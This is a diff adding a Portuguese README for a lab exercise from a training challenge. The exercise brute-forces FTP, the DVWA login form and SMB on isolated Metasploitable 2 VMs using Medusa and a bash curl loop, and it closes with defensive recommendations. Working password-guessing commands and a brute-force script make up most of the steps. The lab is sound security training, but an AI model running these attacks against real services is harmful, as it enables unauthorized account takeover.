@@ -1,0 +1,76 @@
+Desafio DIO - Ataques de Força Bruta com Kali Linux e Medusa
+Descrição do Projeto
+Projeto prático para simular ataques de força bruta em serviços FTP, web (DVWA) e SMB, utilizando Kali Linux, Medusa e ambientes vulneráveis Metasploitable 2 e DVWA.
+
+Ambiente de Teste
+Máquinas virtuais Kali Linux (atacante) e Metasploitable 2 (vítima) no VirtualBox.
+
+Rede interna (host-only) para conexão isolada.
+
+Ferramentas
+Kali Linux
+
+Medusa
+
+Metasploitable 2
+
+DVWA (nível segurança baixo)
+
+Passos e Comandos
+1. Ataque FTP
+bash
+medusa -h 192.168.56.101 -u msfadmin -P wordlists/common-passwords.txt -M ftp
+2. Ataque formulário web DVWA
+Script bash para brute force no login DVWA (formulário via POST):
+
+bash
+#!/bin/bash
+url="http://192.168.56.101/dvwa/vulnerabilities/brute/"
+user="admin"
+wordlist="wordlists/common-passwords.txt"
+
+while read -r password; do
+  response=$(curl -s -X POST -d "username=$user&password=$password&Login=Login" "$url")
+  if [[ $response != *"Login failed"* ]]; then
+    echo "Senha encontrada: $password"
+    break
+  fi
+done < "$wordlist"
+3. Password spraying SMB
+bash
+medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/common-passwords.txt -M smbnt
+Documentação e Resultados
+Wordlists estão na pasta /wordlists
+
+Script está na pasta /scripts (exemplo: dvwa_bruteforce.sh)
+
+Recomendações:
+
+Usar senhas fortes
+
+Bloqueio após tentativas excessivas
+
+Monitoramento e firewalls
+
+Atualizações constantes
+
+Como usar
+Configure VMs Kali Linux e Metasploitable 2 em rede host-only.
+
+Execute comandos e script conforme acima.
+
+Analise resultados e documentação.
+
+Estrutura do Repositório
+text
+desafio-dio-medusa/
+│
+├── README.md
+├── wordlists/
+│   ├── common-passwords.txt
+│   └── users.txt
+├── scripts/
+│   └── dvwa_bruteforce.sh
+├── comandos.txt
+└── images/ (opcional)
+    └── resultados.png
